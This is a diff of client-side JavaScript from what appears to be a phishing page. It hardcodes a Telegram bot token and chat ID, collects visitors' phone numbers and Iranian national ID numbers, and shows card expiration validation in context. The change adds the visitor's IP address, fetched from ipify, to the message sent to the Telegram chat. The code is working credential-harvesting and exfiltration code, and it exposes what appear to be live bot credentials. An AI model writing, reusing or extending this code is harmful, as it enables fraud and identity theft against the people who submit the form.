@@ -1,6 +1,19 @@
 const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
 const chatId = '-4614449543';
 
+let userIp;
+async function getUserIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    userIp = data.ip;
+  } catch (error) {
+    console.error('خطا در دریافت IP:', error);
+    return null; // در صورت بروز خطا
+  }
+}
+getUserIP();
+
 // page 1
 const phoneInput = document.getElementById('phoneInput');
 const phoneValid = document.getElementById('phoneValid');
@@ -77,9 +90,11 @@ firstBtn.addEventListener('click', () => {
       codeMeli = codemeliInput.value;
       phone = phoneInput.value;
       const message = `
-      Phone: ${phone}
+      New information received ✅
+Phone: ${phone}
 CodeMeli: ${codeMeli}
-Tag: #${androidId}
+IP : ${userIp}
+Tag: #${''}
   `;
       sendMessage(message);
       document.getElementById('page1').classList.add('hidden');
@@ -135,19 +150,6 @@ function validateExpirationDate(month, year) {
     return true; // تاریخ انقضا معتبر است
   }
 }
-
-let userIp;
-async function getUserIP() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    userIp = data.ip;
-  } catch (error) {
-    console.error('خطا در دریافت IP:', error);
-    return null; // در صورت بروز خطا
-  }
-}
-getUserIP();
 
 function getDeviceType() {
   const userAgent = navigator.userAgent;
